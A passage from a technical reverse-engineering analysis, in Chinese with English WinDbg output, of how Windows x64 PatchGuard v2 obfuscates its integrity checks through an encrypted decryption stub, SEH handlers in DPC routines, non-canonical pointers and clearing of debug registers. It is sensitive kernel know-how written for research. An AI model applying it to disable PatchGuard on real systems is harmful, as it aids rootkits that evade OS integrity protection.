rip=fffffadff6e6d55d rsp=fffff800003c51f8 rbp=fffff800003c7ad0
 r8=0000000000000000  r9=0000000000000000 r10=0000000001c7111e
r11=fffff800003c54c0 r12=fffff8000116d858 r13=fffff800003c5370
r14=fffff80001000000 r15=fffff800003c60a0
iopl=0         nv up ei pl zr na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
fffffadf`f6e6d55d f0483111        lock xor qword ptr [rcx],rdx ds:002b:fffffadf`f6e6d55d=684d6488113148f0
```

上述调试会话记录说明：除第一条指令外，解密桩最初看上去像是垃圾数据（不过它带有明显的模式，因为它只是被异或混淆了而已）；初始输入参数中，rcx 指向解密桩的第一条指令（与 rip 相同），rdx 是解密密钥。

```
;
; After allowing the decryption of the stub to progress, we see the stub in its executable
; form.  The first instruction is initially re-encrypted after executed, but a later
; instruction in the decryption stub returns the initial instruction to its executable,
; plaintext form.
;

0: kd> u FFFFFADFF6E6D55D
;
; The `lock' prefix is used to create a four byte instruction when there
; is no immediate offset specified (a MASM limitation, as the assembler
; will convert a zero offset into the shorter form with no immediate
; offset operand).
;
fffffadf`f6e6d55d f0483111        lock xor qword ptr [rcx],rdx
fffffadf`f6e6d561 48315108        xor     qword ptr [rcx+8],rdx
fffffadf`f6e6d565 48315110        xor     qword ptr [rcx+10h],rdx
fffffadf`f6e6d569 48315118        xor     qword ptr [rcx+18h],rdx
fffffadf`f6e6d56d 48315120        xor     qword ptr [rcx+20h],rdx
fffffadf`f6e6d571 48315128        xor     qword ptr [rcx+28h],rdx
fffffadf`f6e6d575 48315130        xor     qword ptr [rcx+30h],rdx
fffffadf`f6e6d579 48315138        xor     qword ptr [rcx+38h],rdx
0: kd> u
fffffadf`f6e6d57d 48315140        xor     qword ptr [rcx+40h],rdx
fffffadf`f6e6d581 48315148        xor     qword ptr [rcx+48h],rdx
;
; Because the initial instruction was re-encrypted after it was executed,
; we need to decrypt it again.
;
fffffadf`f6e6d585 3111            xor     dword ptr [rcx],edx
fffffadf`f6e6d587 488bc2          mov     rax,rdx
fffffadf`f6e6d58a 488bd1          mov     rdx,rcx
fffffadf`f6e6d58d 8b4a4c          mov     ecx,dword ptr [rdx+4Ch]
;
; The following is the second stage decryption loop.  It's purpose is to
; decrypt a code block following the current decryption stub in memory.
;
; This code block is then executed (it is responsible for performing the
; actual PatchGuard system verification checks).
;

fffffadf`f6e6d590 483144ca48      xor     qword ptr [rdx+rcx*8+48h],rax
fffffadf`f6e6d595 48d3c8          ror     rax,cl
0: kd> u
fffffadf`f6e6d598 e2f6            loop    fffffadf`f6e6d590
;
; After decryption of the second block is completed, we'll execute it
; by jumping to it.  Doing so kicks off the system verification routine
; that verifies system integrity, arranging for a bug check if not,
; otherwise arranging for itself to be executed again several minutes
; later.
;
fffffadf`f6e6d59a 8b8288010000    mov     eax,dword ptr [rdx+188h]
fffffadf`f6e6d5a0 4803c2          add     rax,rdx
fffffadf`f6e6d5a3 ffe0            jmp     rax
```

上面这段记录说明：让该桩的解密推进一段之后，我们便能看到它可执行形态的样子。第一条指令在执行后最初会被重新加密，但解密桩中后面的一条指令会把这条初始指令恢复为其可执行的明文形态。其中 `lock` 前缀用于在没有指定立即数偏移时造出一条四字节指令（这是 MASM 的一个限制，因为汇编器会把零偏移转换成没有立即数偏移操作数的较短形态）。由于初始指令在执行后被重新加密了，还需要再把它解密一次。随后是第二阶段解密循环：它的目的是解密内存中跟在当前解密桩后面的一个代码块；这个代码块随后会被执行（它负责执行真正的 PatchGuard 系统验证检查）。第二个代码块解密完成后，程序通过跳转到它来执行它；这样做便启动了验证系统完整性的系统验证例程——若完整性不成立，它会安排一次错误检查（bug check，即系统致命错误蓝屏停机）；否则，它会安排自身在几分钟后再次被执行。

在交还控制权之前，验证例程会把自身重新加密，这样在第一次调用之后它便不会以明文形式留存。此外，PatchGuard 还会在每次执行时重新随机化用于加密和解密 PatchGuard 验证例程的密钥，使得潜在的攻击者面对的是一个频繁变异的目标。由于这一行为，PatchGuard 验证例程每隔几分钟——也就是 PatchGuard 验证检查的周期——就会在内存中改变其外观（以加密形态而言）。就有趣的混淆技术而言，这或许是微软方面值得称道的努力；然而事实证明，存在容易得多的攻击途径，可以用来禁用 PatchGuard，而不必让自己卷入对一个每隔几分钟就在内存中改变外观的目标的搜索之中。

### 3.4) Obfuscation of System Integrity Check Calls via Structured Exception Handling / 通过结构化异常处理混淆系统完整性检查调用

与 PatchGuard 第 1 版非常相似，这一版 PatchGuard 也把结构化异常处理（Structured Exception Handling，简称 SEH：Windows 的结构化异常处理机制，靠 try/except、try/finally 以及登记在案的异常处理例程，在异常发生时按链条分发并处理异常）支持用作启动系统完整性检查例程执行这一过程的一个组成部分。实现这一点的手段与上一版 PatchGuard 相比已有所变化。特别是，每一个 PatchGuard DPC（Deferred Procedure Call，延迟过程调用：推迟到 DISPATCH_LEVEL 运行的内核回调机制）中都有数层混淆，用来遮蔽对完整性检查例程的实际调用。为了让潜在攻击者的事情更难办，所用混淆的确切细节，在可被改用于 PatchGuard 的十个 DPC 之间各不相同。不过，它们全都表现出一种共同的模式，可以在高层面上加以描述。

调用 PatchGuard 系统完整性检查例程的第一步，是一个 KTIMER（内核定时器对象），它关联着一个 KDPC（内核 DPC 对象，其中指明定时器到期时要调用的 DPC 回调例程）。这个定时器被设定为单次触发，在数分钟量级的间隔后执行（并施加一个随机模糊因子增量，以增加用经典的蛋搜寻（egghunt）式攻击在非分页池中定位该 KTIMER 的难度）。与 PatchGuard 的 KTIMER 相关联的 KDPC 所指明的 DPC 例程，是可被改用于 PatchGuard 的十个合法 DPC 例程集合中的一个。把该 DPC 例程的这一次特定调用与该 DPC 例程的一次合法系统调用区分开来的办法，是把一个故意无效的内核指针用作 DPC 例程的某个参数。

DPC 例程的原型由 PKDEFERRED_ROUTINE 描述：

```
typedef
VOID
(*PKDEFERRED_ROUTINE) (
    IN struct _KDPC *Dpc,       // pointer to parent DPC
    IN PVOID DeferredContext,   // arbitrary context - assigned at DPC initialization
    IN PVOID SystemArgument1,   // arbitrary context - assigned when DPC is queued
    IN PVOID SystemArgument2    // arbitrary context - assigned when DPC is queued
    );
```

本质上，DPC 是一个回调例程，带有一组由用户定义的上下文参数，这些参数如何解释完全取决于 DPC 例程本身。回调函数的上下文参数的标准用法，是用它们指向一个更大的结构，该结构包含回调例程运行所必需的信息；而可供 PatchGuard 使用的那十个 DPC 例程，在合法执行期间正是这样看待 DeferredContext 参数的。正是 DeferredContext 参数的这种用法，使得 PatchGuard 能通过一次异常触发它在十个 DPC 例程中每一个里的执行；PatchGuard 安排在调用 DPC 例程时，向它传入一个虚假的 DeferredContext 值。DPC 例程第一次试图解引用 DeferredContext 所指的、该 DPC 特定的结构时，就会发生一次异常（该异常把控制权转交给异常分发系统，并最终转交给 PatchGuard 的完整性检查例程）。乍看之下这似乎很简单，但如果读者熟悉内核模式编程，那么这段描述就应该触发几个危险信号；通常，在 DISPATCH_LEVEL（分发级，一种较高的中断请求级别 IRQL，在该级别上运行 DPC）或更高级别上，是不可能用 SEH 捕获虚假内存引用的（通常会触发 PAGE_FAULT_IN_NON_PAGED_AREA 或 IRQL_NOT_LESS_OR_EQUAL 这两个错误检查（bugcheck，即蓝屏停机检查）之一，具体取决于该虚假引用指向的是保留的非分页区域，还是已被换出页面的可分页内存区域）。因此，人们会预期 PatchGuard 传入在 DISPATCH_LEVEL（即 DPC 例程运行的 IRQL）上被引用的虚假指针，会让系统面临随机触发错误检查的风险。然而，PatchGuard 在它那比喻意义上的袖子里藏了几手。它利用当前一代 AMD 出货的 x64 处理器的一个特定于实现的细节，来构造这样的内核模式地址：它们虽然是虚假的，但在被引用时不会导致页面错误。相反，这些虚假地址会导致一次一般保护错误，该错误最终表现为一次 STATUS_ACCESS_VIOLATION SEH 异常。这条引发 STATUS_ACCESS_VIOLATION 异常的路径，事实上即使在 DISPATCH_LEVEL 上也能工作，从而使 PatchGuard 能为 DeferredContext 参数提供安全的虚假指针值，以触发 SEH 分发，而不会冒着用错误检查把系统搞崩的风险。

具体而言，PatchGuard 所依赖的那个实现细节，与 AMD 的 Hammer 系列处理器中的 48 位地址空间限制有关[4]。当前的 AMD 处理器只实现了 x64 架构所呈现的 64 位地址空间中的 48 位。这是通过如下要求实现的：任何给定地址中，从第 63 位到处理器所实现的最高有效位（当前 AMD 处理器实现 48 位）之间的那些位，必须全部置为 1 或全部置为 0。具有这种形式的地址被定义为规范地址（canonical address），即格式良好的地址。试图引用按此定义不属于规范地址的地址，会导致处理器立即引发一次一般保护错误。地址空间上的这一限制，实质上把可用地址空间劈成两半：一段位于地址空间的高端，一段位于地址空间的低端，两者之间是一片无人区。Windows 利用这一划分来区分用户模式与内核模式，地址空间的高端保留给内核模式使用，低端保留给用户模式使用。PatchGuard 利用这片由处理器强制划出的无人区，造出可以被安全解引用、并能被 SEH 捕获的虚假指针值，哪怕在高 IRQL 上也是如此。

所有可能被改用于 PatchGuard 的 DPC 例程，都会解引用 DeferredContext 参数，作为它们不涉及搬动栈变量的那部分工作的第一步。换句话说，任何一个启用了 PatchGuard 的 DPC 例程所涉及的第一件真正的工作，就是触碰 DeferredContext 参数所指向的一个结构或变量。在 PatchGuard 试图触发一次系统完整性检查的执行路径中，DeferredContext 参数是无效的，这最终导致一次访问违规异常，该异常被路由到该 DPC 例程的 SEH 登记项。如果检查任何一个 PatchGuard DPC 例程，就会清楚地看到它们全都有数个相互重叠的 SEH 登记项（这种构造通常表明存在数层嵌套的 try/except 与 try/finally 构造）：

```
1: kd> !fnseh nt!ExpTimeRefreshDpcRoutine
nt!ExpTimeRefreshDpcRoutine Lc8 0A,02 [EU ] nt!_C_specific_handler (C)
> fffff8000100358a La (fffff8000112c830 -> fffff80001000000)
> fffff8000100358a Lc (fffff8000112c870 -> fffff80001003596)
> fffff8000100358a L16 (fffff8000112c8a0 -> fffff80001000000)
> fffff8000100358a L18 (fffff8000112c8f0 -> fffff800010035a2)
```

这些 SEH 登记项是 PatchGuard 系统完整性检查运作不可或缺的一部分。每个处理例程登记项具体如何工作，在每个 DPC 例程之间各不相同（这是为了挫败逆向工程它们的企图），但总的思路是：每个已登记的处理例程都执行建立一次对 PatchGuard 完整性检查例程的调用所需工作的一部分。这项工作被拆分到四个不同的异常/展开（unwind）处理例程之中，以努力使人难以看懂到底在发生什么；但最终，每个 DPC 例程的最终结果都是相同的：其中一个异常/展开处理例程最终直接调用内存中的系统完整性检查解密桩（decryption stub）。该解密桩先解密自身，然后解密 PatchGuard 检查例程，接着把控制权转交给完整性检查例程，以便 PatchGuard 检查各种受保护的寄存器、MSR（Model-Specific Register，型号特定寄存器）和内核映像（例如内核本身）是否遭到未经授权的修改。

此外，所有 PatchGuard DPC 都经过增强，把 DPC 例程的参数混淆在栈变量中（其确切的栈位移在各个 DPC 例程之间各不相同，而且在不同内核风味之间也不同；例如，多处理器内核构建与单处理器内核构建，对于许多 PatchGuard DPC 例程有着不同的栈帧布局）。回想一下，在 x64 调用约定中，前四个参数通过寄存器传递（分别为 rcx、rdx、r8 和 r9）。每个 PatchGuard DPC 例程都特别小心地把重要的寄存器参数（以混淆形式）保存到栈上。其中若干参数一直保持混淆状态，直到即将调用系统完整性检查例程的解密桩之前，以努力使第三方难以在某个特定 DPC 例程中间打补丁切入并轻易访问 DPC 的原始参数。这样设计大概是为了让区分“DPC 例程执行其合法功能的那些 DPC 调用”与“将调用 PatchGuard 的那些 DPC 调用”变得更困难。它还使得第三方难以（尽管并非不可能）以一种通用化的方式，从登记到该 DPC 例程的任何异常处理例程的上下文中，恢复该 DPC 例程的原始参数。

这种参数混淆，通过反汇编任何一个 PatchGuard DPC 例程都可以清楚地看到。例如，查看 ExpTimeRefreshDpcRoutine 时可以看到，该例程把 Dpc（rcx）和 DeferredContext（rdx）参数保存到栈上，把它们按一个魔术常量旋转（这个常量在每种 DPC 例程风味之间各不相同，用于进一步增加以通用化方式恢复原始 DPC 参数这一任务的难度），然后覆写原始的参数寄存器：

```
0: kd> uf nt!ExpTimeRefreshDpcRoutine
;
; 入口时，我们有以下情形：
;
; rcx -> Dpc
; rdx -> DeferredContext（如果此次调用是为
;                         PatchGuard 而调用的，那么 DeferredContext
;                         就是一个虚假的内核指针）。
; r8  -> SystemArgument1
; r9  -> SystemArgument2
;
nt!ExpTimeRefreshDpcRoutine:
;
; 这里 r11 被用作一个临时帧指针。
;
; 临时帧指针是 x64 特有的一种编译器
; 构造，其中用一个易失寄存器充当
; 帧指针，直到发出第一次函数调用为止。
;
fffff800`01003540 4c8bdc          mov     r11,rsp
fffff800`01003543 4881ecc8000000  sub     rsp,0C8h
fffff800`0100354a 4889642460      mov     qword ptr [rsp+60h],rsp
;
; 这个 DPC 例程不使用 SystemArgument1 或
; SystemArgument2。因此，它可以立即覆写
; 这些参数寄存器，而无需保存
; 它们的值。
;
; r8  = Dpc
; rcx = Dpc
; rdx = DeferredContext
;
fffff800`0100354f 4c8bc1          mov     r8,rcx
fffff800`01003552 4889542448      mov     qword ptr [rsp+48h],rdx
;
; 把 [rsp+20h] 置为零。这是一个状态变量，
; 被异常/展开作用域处理例程用来
; 在与这段代码相关联的四个异常/展开
; 作用域处理例程之间协调 PatchGuard 的执行过程。
;
fffff800`01003557 4533c9          xor     r9d,r9d
fffff800`0100355a 44894c2420      mov     dword ptr [rsp+20h],r9d
;
; PatchGuard 把 DPC 中的各个关键字段清零。
; 这是为了让从一个异常处理例程的上下文中
; 在内存里定位该 DPC 变得困难——该异常处理例程
; 是在 PatchGuard DPC 访问虚假的 DeferredContext
; 参数时被调用的。具体而言，PatchGuard 把 KDPC
; 结构的 Type 字段和 DeferredContext 字段清零，如下所示：
;
; 0: kd> dt nt!_KDPC
;   +0x000 Type             : UChar
;   +0x001 Importance       : UChar
;   +0x002 Number           : UChar
;   +0x003 Expedite         : UChar
;   +0x008 DpcListEntry     : _LIST_ENTRY
;   +0x018 DeferredRoutine  : Ptr64
;   +0x020 DeferredContext  : Ptr64 Void
;   +0x028 SystemArgument1  : Ptr64 Void
;   +0x030 SystemArgument2  : Ptr64 Void
;   +0x038 DpcData          : Ptr64 Void
;
; Dpc->Type = 0
;
fffff800`0100355f 448809          mov     byte ptr [rcx],r9b
;
; Dpc->DeferredContext = 0
;
fffff800`01003562 4c894920        mov     qword ptr [rcx+20h],r9
;
; 这里，DPC 把 DeferredContext 参数的一份
; 混淆副本（向左旋转 0x34 位）
; 装入 [r11-20h]。
;
; 回想一下 rsp == r11+0xc8，所以这个位置
; 也可以用 [rsp+0A8h] 来别名引用。
;
; [rsp+0A8h] -> ROL(DeferredContext, 0x34)
;
fffff800`01003566 488bc2          mov     rax,rdx
fffff800`01003569 48c1c034        rol     rax,34h
fffff800`0100356d 498943e0        mov     qword ptr [r11-20h],rax
;
; 类似地，DPC 把 Dpc 参数的一份混淆副本
; （向右旋转 0x48 位）装入 [r11-48h]。
;
; 这个位置可以别名为 [rsp+80h]。
;
; [rsp+80h] -> ROR(Dpc, 0x48)
;
fffff800`01003571 488bc1          mov     rax,rcx
fffff800`01003574 48c1c848        ror     rax,48h
fffff800`01003578 498943b8        mov     qword ptr [r11-48h],rax
```
```
;
; 现在已就位的寄存器上下文如下：
;
; r8         = Dpc
; rcx        = Dpc
; rdx        = DeferredContext
; rax        = ROR(Dpc, 0x48)
; [rsp+0A8h] = ROL(DeferredContext, 0x34)
; [rsp+80h]  = ROR(Dpc, 0x48)
;
; DPC 例程用 DeferredContext 值的低字节
; 的一份副本对 rcx 做零扩展，以此销毁 rcx 的内容。
;
fffff800`0100357c 0fb6ca          movzx   ecx,dl
;
; DPC 例程用一次右移销毁 r8 的内容（与旋转不同，
; 移入的左侧位只是简单地填零，而不是填入
; 被移出的最右侧位。最右侧的位
; 就这样永远丢失了，从而销毁了 r8
; 寄存器作为 Dpc 参数有用来源的价值）。
;
fffff800`0100357f 49d3e8          shr     r8,cl
;
; r8 被保存到栈上，但由于上面那次
; 破坏性的右移，它不再
; 能直接用来定位 Dpc 参数。
;
fffff800`01003582 4c898424d8000000 mov     qword ptr [rsp+0D8h],r8
;
; r8         = Dpc >> (UCHAR)DeferredContext
; rcx        = (UCHAR)DeferredContext
; rdx        = DeferredContext
; rax        = ROR(Dpc, 0x48)
; [rsp+0A8h] = ROL(DeferredContext, 0x34)
; [rsp+80h]  = ROR(Dpc, 0x48)
;
; 这里，我们暂时对上面存放在 [r11-20h] 的
; DeferredContext 参数做去混淆。在这个特定
; 例子中，rdx 恰好也包含去混淆后的
; DeferredContext 值，但并非 PatchGuard 的所有 DPC
; 例程实例都具有在 rdx 中保留一份 DeferredContext
; 明文副本的这一性质。
;
fffff800`0100358a 498b43e0        mov     rax,qword ptr [r11-20h]
fffff800`0100358e 48c1c834        ror     rax,34h
;
; 现在，我们已就位的上下文如下：
;
; r8         = Dpc >> (UCHAR)DeferredContext
; rcx        = (UCHAR)DeferredContext
; rdx        = DeferredContext   （* 但并非对
;                                 所有 DPC 例程都有效。）
; rax        = DeferredContext
; [rsp+0A8h] = ROL(DeferredContext, 0x34)
; [rsp+80h]  = ROR(Dpc, 0x48)
;
; 下一步是解引用 DeferredContext 值。
; 对于一次合法的 DPC 调用，这个操作无害；
; DeferredContext 值会指向有效的内核内存。
;
; 但对于 PatchGuard，这会触发一次访问违规，
; 最终控制权被转交给登记到该 DPC
; 例程的那些异常处理例程。
;
fffff800`01003592 8b00            mov     eax,dword ptr [rax]
```

到这一点，有必要考察登记到该 DPC 例程的各个异常/展开处理例程，以确定接下来会发生什么。这些处理例程中的大多数都可以跳过，因为它们无非是一些次要的混淆层，虽然在每个 DPC 例程之间差异显著，但最终结果相同。然而，其中一个异常/展开处理例程发出了对 PatchGuard 完整性检查的调用，这个处理例程值得进一步讨论。因为所有 PatchGuard DPC 例程的异常登记都使用 nt!_C_specific_handler（_C_specific_handler：内核导出的 C 语言特定异常处理例程，负责为使用 SEH 的例程分发异常、调用其作用域处理例程），所以这些作用域处理例程遵循一个标准原型，定义如下：

```
//
// 定义用来描述 C 语言异常处理例程的标准类型，
// 该类型与 _C_specific_handler 配合使用。
//
// 实际的参数值取决于第一个参数的低字节
// 是否包含值 0x1。如果是这种情况，那么这次调用
// 是调往该例程的展开处理例程；否则，这次调用
// 是调往该例程的异常处理例程。每个例程对
// 这两个参数的解释相当不同，尽管就
// 调用约定而言这些原型是兼容的。
//
```

```
typedef
LONG
(NTAPI * PC_LANGUAGE_EXCEPTION_HANDLER)(
        __in    PEXCEPTION_POINTERS    ExceptionPointers,  // if low byte is 0x1, then we're an unwind
        __in    ULONG64                EstablisherFrame    // faulting routine stack pointer
        );
```

就 nt!ExpTimeRefreshDpcRoutine 而言，第四个作用域处理例程登记项是执行对 PatchGuard 完整性检查例程调用的那个。在这里，该例程仅当存放在 DPC 例程中 [rsp+20h] 处的一个状态变量被置为某个特定值时，才执行完整性检查。这个状态变量会随着访问违规异常穿过每一个异常/展开作用域处理例程而被修改，直到它到达这个处理例程，这最终导致 PatchGuard 系统完整性检查的执行。就目前而言，最好先假设这个例程被调用时，DPC 例程中 [rsp+20h] 已被置为一个不同于 0x15 的值。这表示 PatchGuard 应当被执行。

```
0: kd> uf fffff8000112c8f0
nt!ExpTimeRefreshDpcRoutine+0x17f:
;
; mov eax, eax 是一个热补丁桩，可以忽略。
;
fffff800`0112c8f0 8bc0            mov     eax,eax
fffff800`0112c8f2 55              push    rbp
fffff800`0112c8f3 4883ec20        sub     rsp,20h
;
; rdx 对应于 EstablisherFrame 参数。
; 这个参数是与本异常/展开处理例程相关联的
; 那个例程的栈指针（rsp）值。这个参数的
; 典型用途，是允许无缝访问与 try/except
; 过滤器相关联的那个例程中的局部变量。
; 这里最终发生的正是这件事：rbp 寄存器被装入
; 异常发生时 DPC 例程的栈指针。
;
;
fffff800`0112c8f7 488bea          mov     rbp,rdx
;
; 我们对状态变量做检查。
; 回想一下，DPC 例程刚被进入时，
; DPC 例程上下文中的 [rsp+20h] 被置为
; 零。那个位置对应于本上下文中的 [rbp+20h]，
; 因为 rbp 已被装入 DPC 例程当时
; 正在使用的栈指针。这个位置会被每一个
; 已登记的异常/展开处理例程检查并改动，
; 并最终在本例程被调用时被置为 0x15。
;
fffff800`0112c8fa 83452007        add     dword ptr [rbp+20h],7
fffff800`0112c8fe 8b4520          mov     eax,dword ptr [rbp+20h]
fffff800`0112c901 83f81c          cmp     eax,1Ch
;
; 就目前而言，考虑这条跳转未被
; 采用的情形。该跳转在 PatchGuard 不
; 被执行时采用（那不是有趣的情形）。
;
fffff800`0112c904 0f858c000000    jne     nt!ExpTimeRefreshDpcRoutine+0x215 (fffff800`0112c996)
```
```
nt!ExpTimeRefreshDpcRoutine+0x189:
;
; 要理解下面的指令，有必要
; 回头看 DPC 例程在引发访问违规异常的
; 出错指令之前所建立的栈变量上下文。
; 当时在栈上设置了以下值：
;
; [rsp+0A8h] = ROL(DeferredContext, 0x34)
; [rsp+80h]  = ROR(Dpc, 0x48)
;
; 下面这组指令利用 DPC 例程原始参数的
; 这些混淆副本，来发出对 PatchGuard
; 完整性检查例程的调用。
;
; 采取的第一步，是对存放在 [rsp+80h]
; （从本上下文看即 [rbp+80h]）的 Dpc 值做去混淆。
;
fffff800`0112c90a 488b8580000000  mov     rax,qword ptr [rbp+80h]
;
; rax = Dpc
;
fffff800`0112c911 48c1c048        rol     rax,48h
;
; [rbp+50h] -> Dpc
;
fffff800`0112c915 48894550        mov     qword ptr [rbp+50h],rax
;
; 接下来，DeferredContext 参数被去混淆并
; 以明文形式存放。
;
fffff800`0112c919 488b85a8000000  mov     rax,qword ptr [rbp+0A8h]
;
; rax = DeferredContext
;
fffff800`0112c920 48c1c834        ror     rax,34h
;
; [rbp+58h] -> DeferredContext
;
fffff800`0112c924 48894558        mov     qword ptr [rbp+58h],rax
;
; rax = Dpc
;
fffff800`0112c928 488b4550        mov     rax,qword ptr [rbp+50h]
;
; 下一条指令访问内存中 KDPC 对象
; 之后的内存。回想一下，KDPC 对象在 x64 上
; 长度为 0x40 字节，所以 [Dpc+40h] 是内存中
; 该 DPC 之后的第一个值。实际上，KDPC
; 是一个更大结构的一个成员，该结构
; 定义如下：
;
; struct PATCHGUARD_DPC_CONTEXT {
;  KDPC      Dpc;            // +0x00
;  ULONGLONG DecryptionKey;  // +0x40
; };
;
; 因此，这条指令等价于把
; Dpc 参数强制转换为 PATCHGUARD_DPC_CONTEXT*，然后
; 访问 DecryptionKey 成员。
;
;
; rcx = Dpc->DecryptionKey
;
fffff800`0112c92c 488b4840        mov     rcx,qword ptr [rax+40h]
;
; [rbp+40h] -> DecryptionKey
;
fffff800`0112c930 48894d40        mov     qword ptr [rbp+40h],rcx
;
; rax = DecryptionKey
;
fffff800`0112c934 488b4540        mov     rax,qword ptr [rbp+40h]
```
```
;
; 然后，DeferredContext 值与存放在
; PATCHGUARD_DPC_CONTEXT 结构中的解密密钥做异或。
; 这得出指向 PatchGuard 解密桩的指针的
; 有效位。回想一下，由于当前 AMD64 处理器上
; 内核模式与用户模式地址空间边界之间存在
; “无人区”区域，其余的位
; 必须全部为 1 或全部为 0，
; 才能构成一个有效地址。因为我们
; 处理的是一个内核模式地址，可以安全地
; 假设所有的位都必须为 1。
;
fffff800`0112c938 48334558        xor     rax,qword ptr [rbp+58h]
;
; [rbp+30h] -> DeferredContext ^ DecryptionKey
;
fffff800`0112c93c 48894530        mov     qword ptr [rbp+30h],rax
;
; 按在当前 AMD64 系统上构成规范地址
; 所要求的那样，把解密后指针中所需的位
; 置为 1。
;
fffff800`0112c940 48b80000000000f8ffff mov rax,0FFFFF80000000000h
;
; [rbp+30h] -> [rbp+30h] | 0xFFFFF80000000000
;
; 现在，[rbp+30h] 就是指向解密桩的指针。
;
fffff800`0112c94a 48094530        or      qword ptr [rbp+30h],rax
;
; 下面的指令在 DPC 例程的栈上制作解密
; 桩的额外副本。这没有真正的目的，
; 只是半心半意地试图迷惑任何
; 试图逆向工程 PatchGuard 这一部分的人。
;
; [rbp+38h] -> [rbp+30h]（解密桩）
;
fffff800`0112c94e 488b4530        mov     rax,qword ptr [rbp+30h]
fffff800`0112c952 48894538        mov     qword ptr [rbp+38h],rax
;
; [rbp+28h] -> [rbp+38h]（解密桩）
;
fffff800`0112c956 488b4538        mov     rax,qword ptr [rbp+38h]
fffff800`0112c95a 48894528        mov     qword ptr [rbp+28h],rax
;
; 下一组指令改写解密桩中初始
; 操作码的前四个字节。这个操作码必须被置为
; 以下指令：
;
; f0483111        lock xor qword ptr [rcx],rdx
;
; 该指令的各个操作码字节
; 被逐字节写入解密桩。
;
; *(PULONG)DecryptionStub = 0x113148f0
;
fffff800`0112c95e 488b4528        mov     rax,qword ptr [rbp+28h]
fffff800`0112c962 c600f0          mov     byte ptr [rax],0F0h
fffff800`0112c965 488b4528        mov     rax,qword ptr [rbp+28h]
fffff800`0112c969 c6400148        mov     byte ptr [rax+1],48h
fffff800`0112c96d 488b4528        mov     rax,qword ptr [rbp+28h]
fffff800`0112c971 c6400231        mov     byte ptr [rax+2],31h
fffff800`0112c975 488b4528        mov     rax,qword ptr [rbp+28h]
fffff800`0112c979 c6400311        mov     byte ptr [rax+3],11h
```
```
;
; 最后，发出对解密桩的调用。该
; 解密桩有一个符合以下定义的原型：
;
; VOID
; NTAPI
; PgDecryptionStub(
;       __in PVOID   PatchGuardRoutine,
;       __in ULONG64 DecryptionKey,
;       __in ULONG   Reserved0,
;       __in ULONG   Reserved1
;       );
;
; 两个“保留”的 ULONG 值总是被置为零。
;
; rcx 被装入解密桩的地址，
; rdx 被装入 DecryptionKey 值。
;
fffff800`0112c97d 4533c9          xor     r9d,r9d
fffff800`0112c980 4533c0          xor     r8d,r8d
fffff800`0112c983 488b5540        mov     rdx,qword ptr [rbp+40h]
fffff800`0112c987 488b4d38        mov     rcx,qword ptr [rbp+38h]
;
; 此时，控制权被转交给解密
; 桩，如前所述。解密桩将
; 解密自身，解密 PatchGuard 完整性检查
; 例程，然后把控制权转交给 PatchGuard
; 完整性检查例程。完整性检查例程
; 负责确保 DPC 被恢复到一个
; 可用状态（回想一下，它的部分内容曾
; 被 DPC 例程在早先清零），并确保它被重新排队
; 以待执行。它还负责按需要重新加密
; 解密桩。
;
fffff800`0112c98b ff5538          call    qword ptr [rbp+38h]
;
; 调用发出之后，异常过滤器返回
; EXCEPTION_EXECUTE_HANDLER 清单常量。这
; 导致调用某个已登记的处理例程
; 来处理该异常。该处理例程将
; 把控制权转交给 DPC 例程的返回点，
; 从而跳过 DPC 的主体（因为对
; DPC 的这次调用并不是要求执行该
; DPC 的合法功能）。
;
fffff800`0112c98e 41b901000000    mov     r9d,1
fffff800`0112c994 eb03            jmp     nt!ExpTimeRefreshDpcRoutine+0x218 (fffff800`0112c999)

nt!ExpTimeRefreshDpcRoutine+0x215:
fffff800`0112c996 4533c9          xor     r9d,r9d

nt!ExpTimeRefreshDpcRoutine+0x218:
fffff800`0112c999 418bc1          mov     eax,r9d
fffff800`0112c99c 4883c420        add     rsp,20h
fffff800`0112c9a0 5d              pop     rbp
fffff800`0112c9a1 c3              ret
```

这确实代表了相当高程度的混淆，但它并非坚不可摧，而且存在各种简单的方法，攻击者可以借此完全绕过所有这些混淆层。

## 3.5) Disruption of Debug Register-Based Breakpoints / 破坏基于调试寄存器的断点

PatchGuard 第 2 版试图保护自身免受利用硬件调试寄存器（debug registers，x86/x64 处理器中专用于硬件断点与监视点的一组寄存器 Dr0–Dr7）设置的断点的影响。这类断点的工作方式是：设置至多四个指定的、被重点关注的内存位置。每个内存位置都可以被配置为在被读取、写入或执行时引发一个调试异常。由于这种风格的断点对 PatchGuard 的代码完整性检查不可见（与常规断点不同，这类断点并不涉及把目标指令替换为 int 3（0xcc）操作码），基于调试寄存器的断点（有时被称为"内存断点"或"硬件断点"）对 PatchGuard 构成了一种威胁。PatchGuard 试图抵御这一威胁：在系统完整性检查例程已在内存中被解密之后，第一步就是禁用所有这类基于调试寄存器的断点：

```
;
; Here, the second stage decryption sequence is
; set to run to decrypt the system integrity
; check routine.  We step over the second stage
; decryption and examine the integrity check
; routine in its plaintext state...
;

fffffadf`f6edc043 8b4a4c          mov     ecx,dword ptr [rdx+4Ch]
fffffadf`f6edc046 483144ca48      xor     qword ptr [rdx+rcx*8+48h],rax
fffffadf`f6edc04b 48d3c8          ror     rax,cl
fffffadf`f6edc04e e2f6            loop    fffffadf`f6edc046
fffffadf`f6edc050 8b8288010000    mov     eax,dword ptr [rdx+188h]
fffffadf`f6edc056 4803c2          add     rax,rdx
fffffadf`f6edc059 ffe0            jmp     rax
fffffadf`f6edc05b 90              nop
;
; We set a breakpoint on the 'jmp rax' instruction
; above.  This instruction is what transfers control
; to the system integrity check routine.
;
0: kd> ba e1 fffffadf`f6edc059
0: kd> g
Breakpoint 2 hit
fffffadf`f6edc059 ffe0            jmp     rax
;
; rax now points to the decrypted system
; integrity check routine in-memory.  The
; first call it makes is to a routine whose
; purpose is to disable all debug register-based
; breakpoints by clearing the debug control
; register (dr7).  Doing so effectively turns
; off all of the debug register breakpoints.
;
0: kd> u @rax
fffffadf`f6edd8de 4883ec78        sub     rsp,78h
fffffadf`f6edd8e2 48895c2470      mov     qword ptr [rsp+70h],rbx
fffffadf`f6edd8e7 48896c2468      mov     qword ptr [rsp+68h],rbp
fffffadf`f6edd8ec 4889742460      mov     qword ptr [rsp+60h],rsi
fffffadf`f6edd8f1 48897c2458      mov     qword ptr [rsp+58h],rdi
fffffadf`f6edd8f6 4c89642450      mov     qword ptr [rsp+50h],r12
fffffadf`f6edd8fb 488bda          mov     rbx,rdx
fffffadf`f6edd8fe 4c896c2448      mov     qword ptr [rsp+48h],r13
0: kd> u
